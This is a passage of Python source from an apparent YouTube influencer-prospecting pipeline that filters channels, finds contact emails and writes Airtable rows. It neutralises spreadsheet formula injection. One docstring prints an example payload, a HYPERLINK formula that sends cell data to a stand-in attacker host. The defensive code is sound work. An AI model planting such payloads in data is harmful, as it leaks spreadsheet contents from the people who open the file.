def excluded_topic_reason(*texts: str) -> str | None:
    """
    The first excluded category ('political' | 'asmr' | 'firearms') whose
    terms appear in `texts`, or None. Free — reads only data already fetched
    (the channel title and About description).
    """
    blob = " ".join(t for t in texts if t)
    for category, pattern in _EXCLUDED_TOPIC_PATTERNS.items():
        if pattern.search(blob):
            return category
    return None


def is_english(content_language: str | None) -> bool:
    """
    Whether a content-language tag is English.

    An UNSET tag is not English here — a deliberate break from this
    pipeline's usual "absent data never disqualifies" rule (unknown channel
    age, unknown country). The requirement is that every row's Content
    Language reads as English, and a blank cannot satisfy it; keeping unsets
    would put "Unknown" rows in a table specified to hold English channels.

    The cost of the strict reading was measured before choosing it: across
    197 enriched candidates, ZERO of the 47 that passed every other gate had
    an unset language, because dominant_language() reads the whole 50-video
    window rather than one video. So this discards essentially nothing today
    — but it is the strict direction, and if a future sample does carry
    unsets they will be dropped rather than written as Unknown.
    """
    return (content_language or "").strip().lower().startswith(ENGLISH_LANGUAGE_PREFIX)


def non_latin_script_chars(text: str | None) -> int:
    """How many characters of `text` sit in a NON_LATIN_SCRIPT_RANGES block."""
    return sum(
        1
        for char in (text or "")
        if any(low <= ord(char) <= high for low, high in NON_LATIN_SCRIPT_RANGES)
    )


def description_is_non_english(description: str | None) -> bool:
    """
    True if a channel's description is substantially not in English.

    Complements is_english(), which reads the per-video language TAG. The two
    disagree for a creator who tags uploads "en" but writes their bio in another
    language, which is the case this exists for (see NON_LATIN_SCRIPT_RANGES).

    Measured on SCRIPT, not on language detection: a dependency-free script
    check is decisive for Chinese/Japanese/Korean/Cyrillic/Arabic/Devanagari
    text and needs no model. Its blind spot is a non-English bio written in
    Latin script (Spanish, German, Indonesian), which this cannot see at all —
    those still rely on the video language tag. Worth knowing before trusting
    this as a complete language gate; it is a targeted fix, not a general one.

    An empty description is not evidence of anything and returns False, the same
    "absent data never disqualifies" rule the zone and age checks follow.
    """
    text = (description or "").strip()
    if not text:
        return False
    count = non_latin_script_chars(text)
    if count < MIN_NON_LATIN_DESCRIPTION_CHARS:
        return False
    return (count / len(text)) >= MAX_NON_LATIN_DESCRIPTION_RATIO


def _clears_per_video_floor(settled_views: list[int]) -> bool:
    """
    True if at least MIN_VIEWS_PER_VIDEO_RATIO of `settled_views` reach
    MIN_VIEWS_PER_VIDEO — or if the sample is too small to judge at all.

    `settled_views` holds only videos whose count has settled and is reported
    (see enrichment), so this is a ratio over what can actually be judged, not
    over a flat window size. math.ceil, so "50% of 5" is 3 and a partial video
    always rounds toward requiring one more rather than one fewer.

    Returns True below MIN_SETTLED_SAMPLE_FOR_RATIO judgeable videos: at that
    size the ceil quantises so hard that one upload decides the channel, which
    is a measurement artefact rather than a verdict. Unknown is not a failure —
    the same rule an unknown country or an unreported video_count follows. See
    MIN_SETTLED_SAMPLE_FOR_RATIO for why the floor is 5 and what still applies.
    """
    if len(settled_views) < MIN_SETTLED_SAMPLE_FOR_RATIO:
        return True
    required = math.ceil(MIN_VIEWS_PER_VIDEO_RATIO * len(settled_views))
    clearing = sum(1 for views in settled_views if views >= MIN_VIEWS_PER_VIDEO)
    return clearing >= required


def pre_push_drop_reason(
    subscriber_count: int | None,
    avg_views: float | None,
    shorts_only: bool = False,
    min_avg_views: float = 0,
    video_count: int | None = None,
    content_language: str | None = None,
    settled_views: list[int] | None = None,
    uploads_per_year: float | None = None,
    days_since_last_upload: float | None = None,
) -> str | None:
    """
    Why this candidate should never reach Airtable, or None to continue.

    Applies regardless of what qualify() would have returned — a row for a
    dead channel is exactly the row this gate exists to stop writing.

    Deliberately does NOT cover the search zone, nor the long-form video
    floor. Both need data this function can't get for free — a country
    (see resolve_country) and up to three extra pages of uploads (see
    longform_drop_reason) — so they run as their own steps in
    process_candidate, AFTER everything here. Everything in this function is
    answerable from data already fetched, which is what makes it the cheapest
    place to discard.

    Unknown data never disqualifies, the same rule qualify() follows: a
    `video_count` of None means channels.list didn't report one, and an
    unreported catalogue size is not evidence of a small catalogue. A
    reported 0 is a real answer and is failed like any other number below
    the floor. The ONE exception is `content_language` — see is_english() for
    why an unset language is treated as a failure there.

    `content_language` defaults to None, which fails the English check. That
    default is deliberate: a caller that forgets to pass it gets a loud
    empty result rather than silently skipping the gate.

    `settled_views`, `uploads_per_year` and `days_since_last_upload` are the
    three activity/quality floors (at least MIN_VIEWS_PER_VIDEO_RATIO of the
    settled recent videos over 10k, at least 10 uploads a year, a last upload
    inside a rolling 12 months). They follow the video_count rule, NOT the
    content_language one: each defaults to None and a None never disqualifies,
    because "we couldn't measure it" (nothing settled in the window, fewer than
    two dated uploads, no parseable timestamp) is not evidence against the
    channel. process_candidate supplies real values.

    `settled_views` is a LIST of per-video view counts, not an aggregate: the
    per-video floor is a ratio ("70% of them cleared 10k"), which no single
    number can express. An empty list reads the same as None — unknown.
    """
    if shorts_only:
        return DROP_SHORTS_ONLY
    if not is_english(content_language):
        return DROP_NOT_ENGLISH
    if video_count is not None and video_count < MIN_VIDEO_COUNT:
        return DROP_TOO_FEW_VIDEOS
    if (avg_views or 0) < min_avg_views:
        return DROP_BELOW_VIEW_MINIMUM
    # The per-video floor sits right after the niche's own average floor: both
    # are "views" criteria, and reporting the niche's own bar first keeps the
    # log reading in the reviewer's terms.
    #
    # An empty/absent list means nothing in the window has settled yet — that is
    # unknown, not a failure, so the floor is skipped (the same rule video_count
    # follows above). A short-but-non-empty list is skipped too, inside
    # _clears_per_video_floor; see MIN_SETTLED_SAMPLE_FOR_RATIO.
    if settled_views and not _clears_per_video_floor(settled_views):
        return DROP_VIDEO_BELOW_VIEW_MINIMUM
    if uploads_per_year is not None and uploads_per_year < MIN_UPLOADS_PER_YEAR:
        return DROP_UPLOAD_CADENCE_TOO_LOW
    if days_since_last_upload is not None and days_since_last_upload > MAX_DAYS_SINCE_LAST_UPLOAD:
        return DROP_STALE_CHANNEL
    if (subscriber_count or 0) < JUNK_MIN_SUBSCRIBERS and (avg_views or 0) < JUNK_MIN_AVG_VIEWS:
        return DROP_DEAD_CHANNEL
    return None


def longform_drop_reason(longform_count: int) -> str | None:
    """
    Whether the channel showed MIN_LONGFORM_VIDEO_COUNT confirmed non-Shorts
    uploads, or None to continue.

    Split out from pre_push_drop_reason because establishing the count can
    cost quota (see enrichment.count_longform_in_older_videos), so it must
    run after every free check has had its chance to discard the candidate.

    Unlike `video_count`, a shortfall here IS a failure even though the data
    is partial. That is the point: a channel gets ~200 videos' worth of
    chances to show 30 long-form uploads, and not showing them is the
    evidence, not missing data.
    """
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        return DROP_TOO_FEW_LONGFORM
    return None


def resolve_country(stats: dict, performance: dict) -> str:
    """
    Where the channel says it is, or "" when it says nothing.

      1. `channels.list` -> snippet.country, an ISO 3166-1 alpha-2 code.
         85% of the channels in the live tables set it (29 of 34).
      2. The REGION SUBTAG of the content language ("en-GB" -> GB), for
         the rest. Free — `get_recent_video_performance()` already read
         `defaultAudioLanguage` for the "Content Language" column.

    Both steps are free, so this can run for every surviving candidate.

    Step 2 is a weak signal used only where step 1 is silent, never to
    override it: measured on the live tables the language tag disagrees
    with the declared country for 4 of the 29 channels that have one
    (`en-US` content from India, Austria and Serbia; `fr-FR` from the US).
    A bare language with no region subtag yields nothing at all — see
    search_zones.region_from_language_tag.

    There is deliberately no browser step here. See browser_email.py: the
    About panel's country is the same field as snippet.country, so it
    recovered 0 of the 5 live channels that lack one.

    NOTE — this is NOT the whole zone story. process_candidate runs a THIRD,
    higher-priority signal BEFORE this one: description_location_outside_zone()
    reads an explicit "based in <outside country>" out of the About text and,
    unlike step 2 here, it DOES override a declared snippet.country (a creator
    who set country=US but says "based in the Philippines" is dropped). It is a
    separate gate rather than a source folded in here because (a) it only ever
    votes "outside", never "inside", and (b) it must fire before the paid
    performance/long-form fetch, whereas step 2 above needs content_language
    from that fetch. Precedence, then, is: description-stated-outside (highest)
    > declared snippet.country > language region subtag (lowest).
    """
    country = (stats.get("country") or "").strip()
    if country_code(country):
        return country

    return region_from_language_tag(performance.get("content_language"))


def resolve_email_with_source(
    stats: dict, performance: dict, scraper=None, enricher=None
) -> tuple[str, str, bool | None]:
    """
    Email fallback chain, cheapest and strongest signal first, returning
    (email, source_label, has_external_links) — or ("", "", <flag>) when no
    step found an address:

      1. An address repeated across several recent video descriptions.
      2. A single mention in the channel's own About description.
      3. The same repeat test, extended over OLDER uploads.
      4. influencers.club's enrich-by-handle endpoint, keyed on channel ID.
      5. The channel's public external link list, followed in Playwright:
         each non-third-party link, then its /contact page.

    Steps 1-2 use data already fetched during enrichment and cost
    nothing. Step 3 costs 2 quota units per extra page and only runs when
    1-2 found nothing, so channels whose address is already known never
    trigger it.

    Step 4 precedes step 5 on cost, not on signal quality, and step 5 stays
    last because it reads the creator's OWN site — a different source
    rather than a worse one. influencers.py's module docstring carries that
    argument in full; don't restate it here, or the two drift.

    Step 5 reads the LINK LIST, not the About text — step 2 already has
    the full About description from channels.list, so re-reading it in a
    browser could never add an address. See browser_email.py.

    The third return value, has_external_links, is the "does this channel
    have any web/social presence" signal for the no-social drop (see
    DROP_NO_SOCIAL in process_candidate). It is known whenever the BROWSER is
    enabled, not only when step 5 runs: a channel whose address came from an
    earlier step still gets its link list read (`need_email=False`, one page
    load, no link-following), because having an address says nothing about
    whether the creator exists anywhere off YouTube. It is None only when the
    browser is off or the About panel couldn't be read — absent data, which
    never disqualifies.

    Reporting the source here is what lets callers attribute a hit to a
    step. Comparing the result back against stats/performance can't: steps
    3, 4 and 5 are indistinguishable that way.
    """
    # Both collaborators ship a null object precisely so "absent" is an
    # object that returns "". Normalising here keeps that as the ONE
    # soft-disable mechanism — an `if x is not None` guard per step would
    # be a second one doing the same job, and the two could disagree.
    if enricher is None:
        enricher = null_client()
    if scraper is None:
        scraper = null_scraper()

    email = performance.get("repeated_email")
    source = EMAIL_SOURCE_REPEATED

    if not email:
        email = stats.get("business_email", "")
        source = EMAIL_SOURCE_ABOUT

    if not email:
        email = scan_older_videos_for_email(
            stats["channel_id"],
            stats.get("uploads_playlist_id", ""),
            performance.get("next_page_token", ""),
            performance.get("video_descriptions", []),
        )
        source = EMAIL_SOURCE_OLDER

    if not email:
        email = enricher.find_email(stats["channel_id"])
        source = EMAIL_SOURCE_INFLUENCERS

    if email:
        # The address is settled, but the LINK LIST still has to be read — the
        # no-social drop asks a different question ("does this creator exist
        # anywhere off YouTube?") and an earlier step answering the email
        # question does not answer it.
        #
        # This used to short-circuit here with None, which made DROP_NO_SOCIAL
        # unreachable for any channel steps 1-4 resolved — i.e. nearly all of
        # them, since a repeated address in the video descriptions is the most
        # common hit of the five. Measured 2026-08-15: every one of the 20 rows
        # written that day carried an email, so the gate never once ran, and
        # "Timber Time" (171k subs, a genuinely EMPTY link list) was written as
        # a prospect on the strength of an address in its descriptions.
        #
        # need_email=False keeps the cost to the single About page load and
        # skips the up-to-four link/probe navigations, which are the expensive
        # part and are pointless once an address is in hand.
        _, has_external_links = scraper.find_contact(stats["channel_id"], need_email=False)
        return email, source, has_external_links

    # Step 5. find_contact returns (email, has_external_links); an inert
    # scraper yields ("", None), which correctly leaves the no-social drop
    # dormant rather than discarding every channel.
    email, has_external_links = scraper.find_contact(stats["channel_id"])
    if email:
        return email, EMAIL_SOURCE_BROWSER, has_external_links

    return "", "", has_external_links


def resolve_email(stats: dict, performance: dict, scraper=None, enricher=None) -> str:
    """The chain above, for callers that only need the address itself."""
    return resolve_email_with_source(stats, performance, scraper, enricher)[0]


def push_until_full(
    candidates: list[dict],
    build_record,
    table_name: str,
    qualified_headroom: int,
    flagged_headroom: int = 0,
    flagged_possible: bool = True,
) -> dict:
    """
    Push candidates until both daily budgets are exhausted or the
    candidates run out.

    `build_record(candidate)` returns `(record, qualification)`, or
    `(None, reason)` to skip the candidate without spending budget.

    Only SUCCESSFUL pushes consume budget. The previous loop counted
    attempts, so a run of Airtable failures would have burned the day's
    allowance without writing anything.

    `flagged_possible` says whether this niche can produce a flagged row AT
    ALL — i.e. whether it sets a `min_channel_age_months`. False means
    scoring.qualify() returns QUALIFIED unconditionally, so once the qualified
    budget fills there is nothing left to find and the loop stops instead of
    paying enrichment to prove it. Defaults True so a caller that doesn't know
    gets the safe (keep looking, bounded by FLAGGED_ONLY_PATIENCE) behaviour.

    Returns counts plus "pushed_ids", the Channel IDs actually written —
    matching the original loop, which added to newly_tracked_ids only
    when push_record returned True.
    """
    counts = {"qualified": 0, "flagged": 0, "skipped": 0, "pushed_ids": set()}
    # Candidates enriched since the qualified budget filled without producing a
    # flagged row. See FLAGGED_ONLY_PATIENCE.
    fruitless_flagged_hunt = 0

    for candidate in candidates:
        if counts["qualified"] >= qualified_headroom and counts["flagged"] >= flagged_headroom:
            logger.info("Both daily budgets are full — stopping this niche.")
            break

        # Once the qualified budget is full, only a FLAGGED row can still be
        # written, and a flagged row needs qualify() to return something other
        # than "Qualified" — which only channel age can cause.
        hunting_flagged_only = counts["qualified"] >= qualified_headroom
        if hunting_flagged_only:
            # For a niche with no age requirement that is not merely unlikely,
            # it is IMPOSSIBLE: qualify() returns QUALIFIED unconditionally when
            # min_channel_age_months is None (see scoring.qualify), so no
            # candidate can ever land in the flagged bucket. Stop immediately
            # rather than spending FLAGGED_ONLY_PATIENCE enrichments to
            # rediscover a fact the niche config already states.
            if not flagged_possible:
                logger.info(
                    "Qualified budget is full and this niche has no channel-age "
                    "requirement, so no flagged row can exist — stopping."
                )
                break
            # Otherwise the hunt is a gamble worth a bounded number of tries.
            # Enrichment (3-13 YouTube units) is charged by build_record BEFORE
            # qualification is knowable, so without a brake the loop pays for
            # every remaining candidate and discards each at the bucket check.
            if fruitless_flagged_hunt >= FLAGGED_ONLY_PATIENCE:
                logger.info(
                    "Qualified budget is full and %d candidates produced no flagged "
                    "row — stopping rather than enriching the rest of the batch.",
                    fruitless_flagged_hunt,
                )
                break

        record, qualification = build_record(candidate)
        if record is None:
            counts["skipped"] += 1
            # A gate-dropped candidate still cost enrichment, so it counts
            # against the hunt's patience.
            fruitless_flagged_hunt += hunting_flagged_only
            continue

        bucket = "qualified" if qualification == QUALIFIED else "flagged"
        # Increment and reset live together: a flagged row means the hunt is
        # paying off, anything else means it isn't.
        fruitless_flagged_hunt = 0 if bucket == "flagged" else (
            fruitless_flagged_hunt + hunting_flagged_only
        )

        headroom = qualified_headroom if bucket == "qualified" else flagged_headroom
        if counts[bucket] >= headroom:
            counts["skipped"] += 1
            continue

        if push_record(table_name, record):
            counts[bucket] += 1
            counts["pushed_ids"].add(record["Channel ID"])
        # A failed push is logged inside push_record and costs no budget.

    return counts


# --- Spreadsheet safety for reviewer-facing text -------------------------
# Characters that make a spreadsheet treat a cell's contents as a FORMULA
# rather than as text. The tab and CR are in here because a leading
# whitespace character is stripped by some importers before the formula
# check runs, which puts the "=" back at the front.
SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str) -> str:
    """
    Neutralise a value that a spreadsheet would otherwise run as a formula.

    WHY this exists at all — it looks like a pointless prefix until you
    follow the value to where a human actually reads it:

      - Airtable is NOT a formula-eval context for these values, so nothing
        executes when the record is pushed. That is why this is easy to
        mistake for dead code and "clean up". Don't.
      - But this pipeline's entire purpose is to hand rows to a HUMAN
        reviewer, and the normal thing a reviewer does with an Airtable view
        is export it to CSV and open it in Excel or Google Sheets. THAT is a
        formula-eval context: a cell starting with =, +, -, @ or a leading
        tab/CR is parsed as a formula, not as text.
      - Two of the fields we write are attacker-influenced. "Channel Name"
        is whatever the channel owner typed, and "Email" can come out of
        browser_email.py, which reads arbitrary third-party websites. A
        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
        a live payload in the reviewer's spreadsheet — classic CSV (formula)
        injection, and the reviewer's machine is the target, not ours.

    A leading apostrophe is the fix because it is what spreadsheets
    themselves use to mean "this cell is literal text": Excel and Sheets
    both consume it on import and display the original string.

    Deliberately conservative about what it touches:

      - Only the FIRST character is examined. "Bob's Home Theater" and
        `a-b@c.com` contain dangerous characters but cannot start a formula,
        and mangling ordinary channel names/addresses would make the field
        wrong for every honest candidate to defend against a rare one.
      - Non-strings (and empty strings/None) pass straight through with
        their type intact. Several record fields are genuinely numeric and
        Airtable's Number fields reject strings, so stringifying here would
        break the push for every record.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
        return "'" + value
    return value


def process_candidate(
    candidate: dict,
    external_handles: ExternalIndex,
    blocklist,
    niche_config: dict,
    scraper,
    enricher=None,
    known_channel_ids: set[str] | None = None,
) -> tuple[dict | None, str]:
    """Enrich, screen, qualify, and build an Airtable record for one candidate."""
    known_channel_ids = known_channel_ids or set()
    # A candidate carries EITHER a "channel_id" (discovery.py / YouTube search)
    # OR a "handle" (influencer_discovery.py, which surfaces creators by
    # @handle). get_channel_stats resolves the real UC… id off the response
    # either way, so everything below is keyed on the resolved id.
    channel_id = candidate.get("channel_id")
    cand_handle = candidate.get("handle")

    # Checkpoint 1 — free, before spending ~3 quota units on enrichment.
    hit = blocklist.match(name=candidate.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED (pre-enrichment) %s — DO NOT CONTACT (%s).", candidate.get("channel_title"), hit)
        return None, "blocked"

    # Quota ceiling. Checked AFTER the free blocklist match (which costs
    # nothing, so there is no reason to let a quota refusal hide a blocklist
    # hit) and BEFORE the first paid call below.
    #
    # This is the only ceiling check on the influencers.club discovery path:
    # that source replaces search.list, so can_afford_search() — for a long
    # time the pipeline's ONLY QUOTA_CEILING check — is never reached, and
    # enrichment spend was bounded by nothing but the daily row cap. Row caps
    # bound rows WRITTEN, not candidates EXAMINED, and at a low gate-survival
    # rate those diverge by two orders of magnitude.
    if not can_afford_enrichment():
        return None, DROP_QUOTA_EXHAUSTED

    stats = get_channel_stats(channel_id) if channel_id else get_channel_stats(handle=cand_handle)
    time.sleep(API_SLEEP_SECONDS)
    if stats is None:
        return None, "unreachable"
    # From here on channel_id is the RESOLVED id: the input for a search
    # candidate, the forHandle lookup's result for a discovery candidate.
    channel_id = stats.get("channel_id")
    if not channel_id:
        logger.info("No channel ID resolved for %s — skipping.", cand_handle or "candidate")
        return None, "unreachable"

    # Checkpoint 2 — the reliable key, known only after channels.list.
    hit = blocklist.match(handle=stats.get("handle", ""), name=stats.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
        return None, "blocked"

    # Skip channels already tracked in the base's other YouTube outreach/
    # leads/influencer tables (see external_dedupe.py) — checked here rather
    # than pre-discovery, since we only know a candidate's @handle once
    # channels.list has run. Matches on @handle first and channel NAME second,
    # so a creator who renamed their handle is still caught by name.
    external_hit = match_external(
        external_handles, handle=stats.get("handle", ""), name=stats.get("channel_title", ""),
    )
    if external_hit:
        logger.info(
            "Skipping %s — already tracked in '%s'.",
            stats.get("channel_title"), external_hit,
        )
        return None, "duplicate"

    # Niche-table dedupe by the RESOLVED channel ID. run_niche pre-filters
    # search.list candidates by channel_id before this runs, but discovery
    # candidates arrive as @handles with no id, so this is the only place one
    # already tracked in THIS niche's table is caught. It costs the 1-unit
    # channels.list already spent above; the server-side exclude_handles is
    # what avoids even that once tracked handles are persisted.
    if channel_id in known_channel_ids:
        logger.info(
            "Skipping %s — already tracked in this niche's table.", stats.get("channel_title"),
        )
        return None, "duplicate"

    # Off-brand topic exclusion (political / ASMR / firearms). Reads the title
    # and About description already fetched, and runs BEFORE
    # get_recent_video_performance so an excluded channel skips the
    # performance / longform / email quota below. It is a post-response
    # BACKSTOP, not a cost-free filter: the channels.list unit above is already
    # spent by here, and on the discovery path the creator's 0.01 discovery
    # credit was already billed when the vendor returned it. Saving THOSE would
    # need a server-side negation filter in discovery_filters — a follow-up,
    # and only after the vendor's bio-negation field is verified live the way
    # gender/topics were — the same reason exclude_handles exists. This local
    # gate stays regardless: it is the only tier that also covers the
    # search.list fallback, and it is deterministic across both paths.
    topic = excluded_topic_reason(stats.get("channel_title", ""), stats.get("description", ""))
    if topic:
        logger.info(
            "Dropping %s before push — %s (%s).",
            stats.get("channel_title"), DROP_EXCLUDED_TOPIC, topic,
        )
        return None, DROP_EXCLUDED_TOPIC

    # The channel's own bio must read as English, whatever its per-video
    # language tag says. Free (the description is already fetched) and placed
    # here with the other description checks, so a non-English channel costs no
    # performance fetch. is_english() further down still runs for everyone: the
    # two catch different things, and @LINTAN777 passed that one while failing
    # this.
    if description_is_non_english(stats.get("description", "")):
        logger.info(
            "Dropping %s before push — %s (%d non-Latin script chars in the bio).",
            stats.get("channel_title"), DROP_NON_ENGLISH_DESCRIPTION,
            non_latin_script_chars(stats.get("description", "")),
        )
        return None, DROP_NON_ENGLISH_DESCRIPTION

    # Real-location check: a creator who set snippet.country to the US but
    # states an outside-the-zone location in their About ("based in the
    # Philippines") is dropped here. Free (reads the description already
    # fetched) and placed before the performance fetch; the declared-country
    # zone check further down still runs for everyone whose description says
    # nothing about where they live.
    desc_country = description_location_outside_zone(stats.get("description", ""))
    if desc_country:
        logger.info(
            "Dropping %s before push — %s (description says %s, not the declared country).",
            stats.get("channel_title"), DROP_OUTSIDE_SEARCH_ZONE, desc_country,
        )
        return None, DROP_OUTSIDE_SEARCH_ZONE

    performance = get_recent_video_performance(channel_id, stats.get("uploads_playlist_id"))
    time.sleep(API_SLEEP_SECONDS)
    if performance is None:
        logger.info("Skipping %s — no accessible recent video performance data.", stats.get("channel_title"))
        return None, "unreachable"

    # Activity/quality signals for the gate, all free from data already
    # fetched. upload_freq (videos/month over the sampled window) is computed
    # HERE, before the gate, so the cadence check can read it — and it is
    # reused unchanged for the Overall Score and the "Upload Frequency" column
    # below, never recomputed.
    upload_dates = performance.get("upload_dates", [])
    upload_freq = calc_upload_frequency(upload_dates)
    # None (not 0) when the window is too thin to estimate a cadence — fewer
    # than two dated uploads — so an unmeasurable channel isn't dropped on a
    # made-up zero. See pre_push_drop_reason's None rule.
    uploads_per_year = upload_freq * 12 if len(upload_dates) >= 2 else None
    days_since = days_since_last_upload(upload_dates)

    # Pre-push gate, placed before scoring and before the email chain so a
    # discarded candidate costs no browser session and no deep-scan quota.
    drop_reason = pre_push_drop_reason(
        stats.get("subscriber_count"),
        performance.get("avg_views"),
        performance.get("shorts_only", False),
        min_avg_views=niche_config["min_avg_views"],
        video_count=stats.get("video_count"),
        content_language=performance.get("content_language"),
        settled_views=performance.get("settled_views"),
        uploads_per_year=uploads_per_year,
        days_since_last_upload=days_since,
    )
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%s subs, %s avg views, min %s, %s videos, "
            "%s uploads/yr, %s days since upload, lang %s).",
            stats.get("channel_title"), drop_reason,
            stats.get("subscriber_count"), round(performance.get("avg_views") or 0, 1),
            performance.get("min_views"), stats.get("video_count"),
            round(uploads_per_year, 1) if uploads_per_year is not None else "unknown",
            days_since if days_since is not None else "unknown",
            performance.get("content_language") or "unset",
        )
        return None, drop_reason

    # Search zone. Free — both of resolve_country's sources come out of
    # data already fetched, so this costs no extra call and no page load.
    #
    # A None verdict means the channel declares no country we can read, and
    # is deliberately KEPT — absent data is not evidence against a channel,
    # the same rule qualify() applies to an unknown channel age. Only a
    # positively-outside country is discarded.
    country = resolve_country(stats, performance)
    if zone_verdict(country) is False:
        logger.info(
            "Dropping %s before push — %s (country: %s).",
            stats.get("channel_title"), DROP_OUTSIDE_SEARCH_ZONE, country,
        )
        return None, DROP_OUTSIDE_SEARCH_ZONE

    # Long-form floor, LAST of the discard gates because it is the only one
    # that can cost quota: confirming 30 non-Shorts uploads may need up to
    # LONGFORM_SCAN_MAX_PAGES extra pages (2 units each) for a channel whose
    # newest 50 videos didn't already show them. Every free reason to discard
    # has now had its turn, so nothing is paged for a candidate that was
    # going to be dropped anyway.
    longform_count = performance.get("longform_count", 0)
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        longform_count = count_longform_in_older_videos(
            channel_id,
            stats.get("uploads_playlist_id", ""),
            performance.get("next_page_token", ""),
            already_counted=longform_count,
            target=MIN_LONGFORM_VIDEO_COUNT,
        )
    drop_reason = longform_drop_reason(longform_count)
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%d confirmed non-Shorts of %s total videos).",
            stats.get("channel_title"), drop_reason, longform_count, stats.get("video_count"),
        )
        return None, drop_reason

    # upload_freq was computed once above the pre-push gate (the cadence
    # check needs it) and is reused here rather than recomputed.
    fake_risk = calc_fake_follower_risk(
        stats["subscriber_count"], performance["avg_views"], performance["avg_engagement_rate"]
    )
    overall_score = calc_overall_score(
        stats["subscriber_count"],
        performance["avg_views"],
        performance["avg_engagement_rate"],
        upload_freq,
        fake_risk,
        DEFAULT_NICHE_MATCH,
    )

    # Age is the only qualification question left — the view floor, the
    # video-count floor and the search zone are all hard gates above, so a
    # candidate that reaches here has already passed them.
    qualification = qualify(
        channel_age_months(stats.get("published_at", "")),
        niche_config["min_channel_age_months"],
    )

    email, _email_source, has_external_links = resolve_email_with_source(
        stats, performance, scraper, enricher
    )

    # No-social drop: a channel whose About link list was fetched (step 5 of
    # the email chain ran, because steps 1-4 found no address) and came back
    # EMPTY has no website and no social profile — no outreach surface beyond
    # YouTube, and nothing to vet the creator against. Only a positively-empty
    # list (False) discards; None means the list was never read (the browser
    # is off, or an address was already found at an earlier step) and the
    # channel is KEPT — the same "absent data never disqualifies" rule the
    # zone check follows. Runs after the email chain because the signal comes
    # OUT of that chain's own link-list fetch, at no extra cost.
    if has_external_links is False:
        logger.info(
            "Dropping %s before push — %s (no external links and no contact email).",
            stats.get("channel_title"), DROP_NO_SOCIAL,
        )
        return None, DROP_NO_SOCIAL

    # Checkpoint 3 — catches agency addresses shared across channels.
    if email:
        hit = blocklist.match(email=email)
        if hit:
            logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
            return None, "blocked"

    # csv_safe() is applied to the FREE-TEXT fields only — see its docstring
    # for why (the reviewer exports this view to CSV and opens it in Excel).
    # Which fields are excluded, and why, matters as much as which are
    # wrapped; each exclusion is noted at its line below.
    record = {
        # Attacker-controlled: whatever the channel owner typed.
        "Channel Name": csv_safe(stats["channel_title"]),
        # NOT wrapped: "Channel URL" and "Channel ID" are matched on EXACTLY
        # elsewhere. Channel ID in particular is the dedupe key
        # airtable_client.channel_exists() looks up by, so a leading
        # apostrophe would make every existing row invisible to the lookup
        # and the pipeline would re-POST duplicates instead of PATCHing.
        # Neither field can carry a payload anyway: both are derived from a
        # YouTube channel ID, which is a fixed-alphabet "UC..." string.
        "Channel URL": f"https://www.youtube.com/channel/{channel_id}",
        "Channel ID": channel_id,
        # NOT wrapped: numeric fields. Airtable's Number fields reject
        # strings, and csv_safe() passes non-strings through untouched
        # precisely so that a mistake here fails loudly rather than being
        # papered over.
        "Subscriber Count": stats["subscriber_count"],
        "Avg Views (last 10 videos)": round(performance["avg_views"], 1),
        "Engagement Rate": round(performance["avg_engagement_rate"], 2),
        # "Upload Frequency" is a text field in Airtable (not Number) — it
        # rejects raw JSON numbers, so this must be sent as a string.
        # Rounded to a whole number for display; the unrounded value is
        # still what feeds calc_overall_score above.
        #
        # NOT wrapped: this string is built here and always starts with a
        # digit, so csv_safe() would be a guaranteed no-op. Harmless either
        # way; left off so the wrapped fields are exactly the ones carrying
        # third-party text.
        "Upload Frequency": f"{round(upload_freq)} videos/month",
        # Best-effort: most creators never set defaultAudioLanguage/
        # defaultLanguage on their videos, so this is frequently "Unknown".
        # Channel *country* (stats["country"]) is a separate signal and is
        # deliberately not used here, since it isn't the same thing as the
        # content's spoken language.
        #
        # Wrapped: it's a free-text field echoing a value the channel owner
        # set on their videos.
        "Content Language": csv_safe(performance.get("content_language") or "Unknown"),
        # Attacker-influenced: chain step 5 (browser_email.py) reads
        # arbitrary third-party websites for this.
        "Email": csv_safe(email),
        "Fake Follower Risk Score": fake_risk,
        "Overall Score": overall_score,
        # NOT wrapped: Single Select values that must match an existing
        # Airtable option EXACTLY. push_record sends typecast=True, which
        # silently CREATES a missing option rather than erroring — so a
        # mangled "'Qualified" would quietly mint a new option and drop the
        # row out of the reviewer's saved views. Both values are ours
        # (scoring.py / config.py), not third-party text.
        "Qualification": qualification,
        "Status": DEFAULT_STATUS,
        # Wrapped for consistency rather than out of fear: the keywords are
        # our own NICHES entries, so the risk is low, but it is still a text
        # field assembled from data and there is no reason to leave the one
        # free-text field uncovered.
        "Source": csv_safe(f"{SOURCE_LABEL} ({', '.join(candidate.get('matched_keywords', []))})"),
        "Notes": "",
        # NOT wrapped: a date value from prospect_day.today_iso(), not text.
        "Date Added": today_iso(),
    }

    # The creator's @handle, written ONLY when the column exists.
    #
    # Purpose: discovery's server-side exclude_handles takes handles, not channel
    # IDs, so without this column every row in this table is returned and BILLED
    # (0.01 each) on every run, then resolved at one YouTube unit just to be
    # recognised and discarded. Storing it here is what lets the NEXT run tell
    # the vendor not to send them.
    #
    # Guarded because push_record sends field names as-is and Airtable rejects
    # the WHOLE record for one unknown field — writing this blind before the
    # column exists would break every push. table_has_field() probes once per
    # table per run and caches, so this costs one tiny read and turns "column
    # not added yet" into a no-op.
    #
    # NOT wrapped by csv_safe: handles are matched on EXACTLY (by the vendor's
    # exclusion and by get_tracked_handles), so a prepended apostrophe would
    # silently stop every exclusion working — the same reasoning that keeps
    # Channel ID unwrapped. A YouTube handle cannot carry a formula payload.
    # table_name off niche_config, since process_candidate isn't given it
    # directly. Absent in unit-test configs, which correctly skips the probe.
    handle = (stats.get("handle") or "").strip().lstrip("@")
    niche_table = niche_config.get("table_name")
    if handle and niche_table and table_has_field(niche_table, "Handle"):
        record["Handle"] = handle

    return record, qualification


def _external_priority(external_handles, source_hint: str) -> list[str]:
    """
